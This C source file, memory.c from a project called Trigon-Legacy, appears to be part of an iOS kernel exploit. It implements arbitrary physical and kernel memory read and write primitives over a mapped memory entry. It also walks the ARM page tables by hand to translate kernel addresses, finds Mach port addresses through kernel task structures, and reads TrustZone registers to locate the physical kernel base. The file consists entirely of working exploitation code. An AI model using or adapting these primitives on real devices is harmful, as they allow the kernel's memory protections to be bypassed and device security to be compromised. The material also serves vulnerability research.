//
//  memory.c
//  Trigon-Legacy
//

#include "memory.h"

mach_vm_address_t map_at_offset(uint64_t offset, size_t mapping_size) {
    mach_vm_address_t mapping_addr = 0;
    kern_return_t kr = KERN_FAILURE;
    kr = mach_vm_map(mach_task_self(), &mapping_addr, mapping_size, 0,
                     VM_FLAGS_ANYWHERE, largeMemoryEntry,
                     offset,
                     0, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT);
    if (kr != KERN_SUCCESS) {
        ERR("ERROR: failed to map offset 0x%llX %s", offset, mach_error_string(kr));
        return -1;
    }
    return mapping_addr;
}

ret_t physreadbuf(uint64_t pa, void *buffer, size_t size) {
    uint64_t align = dev_info->kernel_config.phys_align;
    uint64_t trunc_pa = pa & ~(align - 1);
    uint64_t trunc_size = pa - trunc_pa;
    uint64_t offset = trunc_pa - gMappingBase;
    mach_vm_address_t ua = 0;
    
    kern_return_t kr = mach_vm_map(mach_task_self(), &ua, align, 0,
                                   VM_FLAGS_ANYWHERE, largeMemoryEntry,
                                   offset,
                                   0, VM_PROT_READ, VM_PROT_READ, 0);
    if (kr != KERN_SUCCESS) {
        ERR("ERROR: failed to map PA 0x%llX %s", pa, mach_error_string(kr));
        return RET_ERR;
    }
    memcpy(buffer, (void *)((uint64_t)ua + trunc_size), size);
    mach_vm_deallocate(mach_task_self(), ua, align);
    return RET_SUCCESS;
}

ret_t physwritebuf(uint64_t pa, void *buffer, size_t size) {
    uint64_t align = dev_info->kernel_config.phys_align;
    uint64_t trunc_pa = pa & ~(align - 1);
    uint64_t trunc_size = pa - trunc_pa;
    uint64_t offset = trunc_pa - gMappingBase;

    mach_vm_address_t ua = 0;
    kern_return_t kr = mach_vm_map(mach_task_self(), &ua, align, 0,
                                   VM_FLAGS_ANYWHERE, largeMemoryEntry,
                                   offset,
                                   0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, 0);
    if (kr != KERN_SUCCESS) {
        ERR("ERROR: failed to map PA 0x%llX %s", pa, mach_error_string(kr));
        return RET_ERR;
    }
    memcpy((void *)((uint64_t)ua + trunc_size), buffer, size);
    mach_vm_deallocate(mach_task_self(), ua, align); 
    return RET_SUCCESS;
}

uint64_t physread64(uint64_t pa) {
    uint64_t val = 0;
    physreadbuf(pa, &val, sizeof(val));
    return val;
}

uint32_t physread32(uint64_t pa) {
    uint32_t val = 0;
    physreadbuf(pa, &val, sizeof(val));
    return val;
}

ret_t physwrite64(uint64_t pa, uint64_t val) {
    return physwritebuf(pa, &val, sizeof(val));
}

ret_t physwrite32(uint64_t pa, uint32_t val) {
    return physwritebuf(pa, &val, sizeof(val));
}

uint64_t early_rk64(uint64_t va) {
    return physread64(kvtophys(va));
}

uint32_t early_rk32(uint64_t va) {
    return physread32(kvtophys(va));
}

ret_t early_wk64(uint64_t va, uint64_t val) {
    return physwrite64(kvtophys(va), val);
}

ret_t early_wk32(uint64_t va, uint32_t val) {
    return physwrite32(kvtophys(va), val);
}

uint64_t kvtophys(uint64_t va) {
    if (va >= dev_info->kernel_state.kVirtBase && va < dev_info->kernel_state.kVirtEnd) {
        return va - dev_info->kernel_state.kVirtBase + dev_info->kernel_state.kPhysBase;
    }
    struct pte_info* pteinfo = &dev_info->pteinfo;
    
    uint64_t l1_index = (va >> (pteinfo->offset_bit + pteinfo->table_index + pteinfo->table_index)) & pteinfo->table_mask; // page_offset + l2_idx + l3_idx
    uint64_t l1_tte = physread64(dev_info->kernel_state.cpu_ttep + (l1_index * sizeof(uint64_t)));
    if (!IS_PHYS_ADDR(l1_tte)) return 0;
    if ((l1_tte & 0x3) != 0x3) return l1_tte & 0x3;
    
    uint64_t l2_table = l1_tte & ~(pteinfo->offset_mask); // strip last pte bits
    uint64_t l2_index = (va >> (pteinfo->offset_bit + pteinfo->table_index)) & pteinfo->table_mask; // page_offset + l3_idx
    uint64_t l2_tte = physread64(l2_table + (l2_index * sizeof(uint64_t)));
    
    if (!IS_PHYS_ADDR(l2_tte)) return 0;
    if ((l2_tte & 0x3) == 0x1) {
        return (l2_tte &~(pteinfo->offset_mask)) | (va & pteinfo->offset_mask);
    }
    
    if ((l2_tte & 0x3) == 0x3) {
        uint64_t l3_table = l2_tte & ~(pteinfo->offset_mask); // strip last pte bits
        uint64_t l3_index = (va >> (pteinfo->offset_bit)) & pteinfo->table_mask; // page_offset;
        uint64_t l3_tte = physread64(l3_table + (l3_index * sizeof(uint64_t)));
        
        if (!IS_PHYS_ADDR(l3_tte)) return 0;
        if ((l3_tte & 0x3) != 0x3) return 0;
        uint64_t ptr = (l3_tte &~(pteinfo->offset_mask)) | (va & pteinfo->offset_mask);
        ptr &= 0x0000FFFFFFFFFFFF;
        return ptr;
    }
    return 0;
}

uint64_t find_port(uint64_t self_proc_phys, mach_port_name_t port) {
    uint64_t self_task = physread64(self_proc_phys + dev_info->kstruct_offsets.proc_task);
    uint64_t itk_space = early_rk64(self_task + dev_info->kstruct_offsets.task_itk_space);
    uint64_t is_table = early_rk64(itk_space + dev_info->kstruct_offsets.is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = early_rk64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_port_from_task(uint64_t task, mach_port_name_t port) {
    uint64_t itk_space = early_rk64(task + dev_info->kstruct_offsets.task_itk_space);
    uint64_t is_table = early_rk64(itk_space + dev_info->kstruct_offsets.is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = early_rk64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_port_from_is_table(uint64_t is_table, mach_port_name_t port) {
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = pipe_read_64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_phys_kbase_static(void) {
    uint64_t tz0_start, tz0_end, tz1_start, tz1_end;
    uint64_t dram_base = 0x800000000;
    uint64_t kbase_offset = (dev_info->major <= 8) ? 0x2000 : 0x4000;

    if (dev_info->major == 7) {
        DEBUG("iOS 7 can't read MMIO, returning minimum guess");
        return dram_base + kbase_offset;
    }

    if (dev_info->cpu_family == CPUFAMILY_ARM_CYCLONE) {
        uint32_t tz0_raw = physread32(0x200000908);
        uint32_t tz1_raw = physread32(0x20000090C);

        tz0_start = dram_base + ((uint64_t)(tz0_raw & 0xffff) << 20);
        tz0_end   = dram_base + (((uint64_t)(tz0_raw >> 16) + 1) << 20);
        tz1_start = dram_base + ((uint64_t)(tz1_raw & 0xffff) << 20);
        tz1_end   = dram_base + (((uint64_t)(tz1_raw >> 16) + 1) << 20);
    } else {
        uint32_t tz0_start_raw = physread32(0x200000480);
        uint32_t tz0_end_raw   = physread32(0x200000484);
        uint32_t tz1_start_raw = physread32(0x200000488);
        uint32_t tz1_end_raw   = physread32(0x20000048C);

        tz0_start = dram_base + ((uint64_t)tz0_start_raw << 12);
        tz0_end   = dram_base + (((uint64_t)tz0_end_raw + 1) << 12);
        tz1_start = dram_base + ((uint64_t)tz1_start_raw << 12);
        tz1_end   = dram_base + (((uint64_t)tz1_end_raw + 1) << 12);
    }

    if (tz0_start != dram_base) {
        DEBUG("TZ0 start isn't DRAM base: %#llx, returning minimum guess", tz0_start);
        return dram_base + kbase_offset;
    }

    uint64_t kbase = (tz0_end == tz1_start) ? tz1_end : tz0_end;
    return kbase + kbase_offset;
}